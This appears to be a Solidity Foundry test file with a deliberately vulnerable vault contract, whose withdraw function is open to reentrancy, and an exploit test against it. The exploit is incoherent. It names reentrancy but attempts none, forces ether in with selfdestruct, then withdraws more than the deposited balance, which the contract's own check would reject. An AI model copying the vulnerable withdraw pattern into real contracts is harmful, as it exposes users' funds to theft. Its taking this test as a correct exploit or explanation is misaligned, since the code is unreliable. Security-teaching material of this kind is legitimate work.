// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

contract VulnerableVault {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint amount) public {
        require(balances[msg.sender] >= amount, "Insufficient balance");

        // Vulnerability: External call before state update (Reentrancy)
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");

        balances[msg.sender] -= amount;
    }
}

contract ExploitTest is Test {
    VulnerableVault vault;
    address attacker = address(0xdeadbeef);

    function setUp() public {
        // Deploy the vulnerable contract
        vault = new VulnerableVault();

        // Fund the attacker with some initial ETH
        vm.deal(attacker, 1 ether);

        // Attacker deposits 1 ether into the vault
        vm.prank(attacker);
        vault.deposit{value: 1 ether}();
    }

    function test_exploit() public {
        // Step 1: Attacker sends ether to the contract using selfdestruct
        address payable vaultAddress = payable(address(vault));
        vm.deal(address(this), 1 ether);
        selfdestruct(vaultAddress);

        // Step 2: Attacker withdraws more than their balance
        uint attackerInitialBalance = attacker.balance;
        vm.prank(attacker);
        vault.withdraw(2 ether); // Withdraw 2 ether, only deposited 1 ether

        // Assert the vulnerability
        assertGt(attacker.balance, attackerInitialBalance);
    }
}